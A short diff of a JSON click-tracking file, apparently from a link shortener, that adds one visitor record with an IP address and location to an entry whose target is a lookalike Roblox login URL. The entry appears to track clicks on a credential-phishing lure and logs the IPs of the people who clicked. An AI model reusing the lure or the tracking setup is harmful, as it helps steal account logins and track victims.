@@ -14161,7 +14161,7 @@
     "targetUrl": "https://roblox.com.bz/login?returnUrl=2671794013209664",
     "createdAt": 1778688484557,
     "status": "active",
-    "useCount": 15,
+    "useCount": 16,
     "createdBy": "admin",
     "clicks": [
       {
@@ -14283,6 +14283,14 @@
         "city": "Maturín",
         "flag": "🇻🇪",
         "countryCode": "VE"
+      },
+      {
+        "timestamp": 1779300499478,
+        "ip": "166.199.98.51",
+        "country": "United States",
+        "city": "Los Angeles",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
